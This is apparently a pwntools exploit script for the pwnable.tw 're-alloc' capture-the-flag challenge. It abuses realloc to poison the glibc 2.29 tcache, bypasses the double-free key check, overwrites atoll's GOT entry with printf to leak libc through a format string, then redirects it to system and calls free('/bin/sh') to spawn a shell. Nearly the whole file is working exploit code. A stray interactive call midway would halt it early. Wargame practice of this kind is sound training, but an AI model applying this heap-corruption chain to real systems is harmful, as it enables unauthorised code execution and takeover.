from pwn import *
import sys

elf = ELF('./re-alloc')
if sys.argv[1] == 'r':
    p = remote('chall.pwnable.tw', 10106)
    libc = ELF('./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so')
elif sys.argv[1] == 'l':
    p = process('./re-alloc_local', env={"LD_PRELOAD":"libc-2.29.so"})
    libc = ELF('libc-2.29.so')
    context.terminal = ['tmux', 'splitw', '-h']
    gdb.attach(proc.pidof(p)[0], gdbscript='''
                                            continue
                                            ''')
atoll_got = elf.got['atoll']    
printf_plt = elf.plt['printf']

def alloc(index, size, data):
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Index:", str(index))
    p.sendlineafter("Size:", str(size))
    p.sendafter("Data:", data)

def realloc(index, size, data):
    p.sendlineafter("Your choice: ", "2")
    p.sendlineafter("Index:", str(index))
    p.sendlineafter("Size:", str(size))
    if size != 0:
        p.sendafter("Data:", data)

def free(index):
    p.sendlineafter("Your choice: ", "3")
    p.sendlineafter("Index:", str(index))

    
"""
ptr == 0: malloc(new_size)
ptr != 0 && new_size == 0: free(ptr)
ptr != 0 && new_size == old_size: edit (ptr)
ptr != 0 && new_size < old_size: edit(ptr) and free(remainder)
ptr != 0 && new_size > old_size: new_ptr = malloc(new_size); strcpy(new_ptr, ptr); free(ptr); return new_ptr;
"""
def solve():
    # tcache[0x20] => atoll_got
    # heap[0] => chunk(0x18) <= heap[1]
    alloc(0, 0x18, "AAAA")
    realloc(0, 0, "")                   # tcache bins: [ heap[0] ]
    realloc(0, 0x18, p64(atoll_got))    # tcache bins: [ heap[0] => atoll_got]      (new_size == old_size)
    alloc(1, 0x18, "BBBB")              # tcache bins: [ atoll_got ]


    # set heap[0]== heap[1] == NULL 
    realloc(0, 0x28, "CCCC")    # when realloc, if size > old_size and there is only 1 chunk in heap => expand
    free(0)
    realloc(1, 0x28, "D"*0x10)  # overwrite key check (tcache glibc 2.29)
    free(1)                     # doublefree here, but we only need to set heap[0] and heap[1] to NULL
    p.interactive()
    # tcache[0x40] => atoll_got
    # heap[0] => chunk(0x38) <= heap[1]
    alloc(0, 0x38, "AAAA")
    realloc(0, 0, "")
    realloc(0, 0x38, p64(atoll_got))
    alloc(1, 0x38, "BBBB")

    # set heap[0] == heap[1] == NULL
    realloc(0, 0x48, "CCCC")
    free(0)
    realloc(1, 0x48, "D"*0x10) # overwrite key check (tcache glibc 2.29)
    free(1)                    # doublefree here, but we only need to set heap[0] and heap[1] to NULL

    alloc(1, 0x38, p64(printf_plt))     # allocate the chunk in tcache[0x40]
    free("%21$llx")                     # atoll overwritten to => prtinf("%21$llx")

    libc_start_main_ret = int(p.recv(12), 16)
    libc.address = libc_start_main_ret - libc.symbols["__libc_start_main"] - 0xeb
    system_addr = libc.symbols["system"]

    log.success("system address: " + hex(system_addr))
    # after atoll is overwritten by printf, the return value of atoll will be the return value of printf => length of string printed
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Index:", "\x00")
    p.sendafter("Size:", "A"*15 + '\x00')  # allocate the chunk in tcache[0x20]
    p.sendafter("Data:", p64(system_addr))

    # input "/bin/sh" and call system
    free("/bin/sh\x00")
    p.interactive()

if __name__ == '__main__':
    solve()

"""
double check tcache glibc 2.29: The double free check is performed only when e->key==tcache
carefull when realloc new_size > old_size with chunk near top_chunk, it will expand the old chunk
"""
